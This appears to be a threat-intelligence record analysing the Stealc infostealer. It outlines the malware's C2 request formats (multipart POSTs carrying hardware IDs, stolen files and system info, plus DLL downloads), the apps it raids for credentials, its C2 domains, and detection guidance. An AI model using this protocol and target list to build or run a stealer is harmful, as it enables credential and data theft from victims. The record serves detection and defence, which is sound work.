package_info.package_manager: standalone Windows binary (not a package manager ecosystem)
package_info.package_versions: N/A (malware family, not versioned as a package)
package_info.why_malicious: Stealc is a purpose-built infostealer malware designed to exfiltrate sensitive data from infected systems, including browser credentials, cryptocurrency wallets, system information, and files. It communicates with attacker-controlled C2 servers, dynamically downloads configuration and modules, and exfiltrates stolen data, exhibiting a wide range of credential access, discovery, collection, and exfiltration behaviors.

malicious_snippets.code_snippet:
POST /<gate>.php HTTP/1.1
Content-Disposition: form-data; name="hwid"
Content-Disposition: form-data; name="build"

[HWID and build name sent to C2]
malicious_snippets.code_behavior: At runtime, the code collects the victim's hardware identifier (HWID) and build name, then sends this data to the C2 server via an HTTP POST request, enabling host fingerprinting and campaign tracking.

malice_analysis.why_suspicious: Malware typically fingerprints victims to track infections and tailor payloads. Legitimate software rarely sends HWID and build info to unknown remote servers.
malice_analysis.violated_expectations: Normal software does not exfiltrate unique hardware identifiers to untrusted servers without user consent.
malice_analysis.similar_legitimate_use: Enterprise software may send anonymized telemetry to vendor servers for licensing or support.
key_indicators: Exfiltration of HWID/build to external C2
Use of multipart/form-data POST to .php endpoint

malicious_snippets.code_snippet:
POST /<gate>.php HTTP/1.1
Content-Disposition: form-data; name="token"
Content-Disposition: form-data; name="message"

browsers
malicious_snippets.code_behavior: At runtime, the code requests browser data collection configuration from the C2 server by sending a POST request with the message 'browsers', receiving a base64-encoded configuration in response.

malice_analysis.why_suspicious: Dynamic retrieval of configuration for data theft is a hallmark of modular malware.
malice_analysis.violated_expectations: Legitimate software does not request browser data collection instructions from remote C2 servers.

malicious_snippets.code_behavior: At runtime, the code requests browser extension data collection configuration from the C2 server by sending a POST request with the message 'plugins', receiving a base64-encoded configuration in response.

malice_analysis.why_suspicious: Malware modularity and dynamic configuration for targeting browser extensions is highly suspicious.
malice_analysis.violated_expectations: Normal applications do not fetch browser extension data collection instructions from remote servers.

malicious_snippets.code_snippet:
POST /<gate>.php HTTP/1.1
Content-Disposition: form-data; name="token"
Content-Disposition: form-data; name="file_name"
Content-Disposition: form-data; name="file"

[system_info.txt: network, system summary, user agents, installed apps, process list]
malicious_snippets.code_behavior: At runtime, the code collects detailed system fingerprinting data (network info, system summary, user agents, installed apps, process list) and exfiltrates it as system_info.txt to the C2 server via HTTP POST.

malice_analysis.why_suspicious: Comprehensive system fingerprinting and exfiltration is a classic infostealer behavior.
malice_analysis.violated_expectations: Legitimate software does not silently collect and exfiltrate such broad system data.
key_indicators: Collection of process list, installed apps, user agents

malicious_snippets.code_snippet:
GET /<path>/<dllname>.dll HTTP/1.1

[downloads 7 DLLs: freebl3.dll, mozglue.dll, msvcp140.dll, nss3.dll, softokn3.dll, sqlite3.dll, vcruntime140.dll]
malicious_snippets.code_behavior: At runtime, the code downloads 7 legitimate third-party DLLs from the C2 server using HTTP GET requests, enabling modular functionality and evasion.

malice_analysis.why_suspicious: Malware often downloads additional modules or dependencies to extend functionality or evade detection.
malice_analysis.violated_expectations: Normal software retrieves dependencies from trusted sources, not attacker-controlled C2 servers.
malice_analysis.similar_legitimate_use: Software updaters may download DLLs from vendor servers.

malicious_snippets.code_snippet: [Obfuscated code to collect and exfiltrate file paths or registry keys for Discord, Telegram, Tox, Outlook, Steam]
malicious_snippets.code_behavior: At runtime, the code locates and collects sensitive data from Discord, Telegram, Tox, Outlook, and Steam by accessing specific file paths or Windows Registry keys, then exfiltrates the data to the C2 server.

malice_analysis.why_suspicious: Harvesting credentials and session data from popular communication and gaming apps is a classic infostealer tactic.
malice_analysis.violated_expectations: Legitimate software does not access or exfiltrate other application's sensitive data.

malicious_snippets.code_behavior: At the end of execution, the code notifies the C2 server that data collection and exfiltration is complete by sending a 'done' message.

malice_analysis.why_suspicious: Explicitly signaling completion to C2 is a sign of coordinated malware operation.
malice_analysis.violated_expectations: Normal software does not notify remote C2 of completion of data theft.

behavioral_signatures: HTTP POST requests to .php endpoints with multipart/form-data containing 'hwid', 'build', 'token', 'message', 'file_name', 'file'
Dynamic retrieval of configuration for browsers, plugins, wallets, and files
Exfiltration of system_info.txt and user files
Download of DLLs from non-standard, untrusted remote servers
Obfuscated access to application data and registry keys for Discord, Telegram, Tox, Outlook, Steam
Explicit 'done' message sent to C2 at end of execution
file_indicators: files\DESKTOP\SwitchSearch.txt (or other user files as defined in config)
Downloaded DLLs: freebl3.dll, mozglue.dll, msvcp140.dll, nss3.dll, softokn3.dll, sqlite3.dll, vcruntime140.dll
network_indicators: POST requests to C2 servers at .php endpoints (see IOCs for domains and IPs)
GET requests for DLLs from C2 servers
C2 domains: 666palm.com, 777palm.com, aa-cj.com, fff-ttt.com, moneylandry.com, and associated IPs
detection_knowledge.how_to_detect: Monitor for outbound HTTP POST requests to suspicious .php endpoints with multipart/form-data containing fields such as 'hwid', 'build', 'token', 'message', 'file_name', and 'file'. Flag downloads of DLLs from non-standard remote servers. Look for exfiltration of system_info.txt and other user files. Correlate with known C2 domains and IPs. Use YARA and Suricata rules to detect characteristic strings, deobfuscation routines, and network behaviors associated with Stealc.
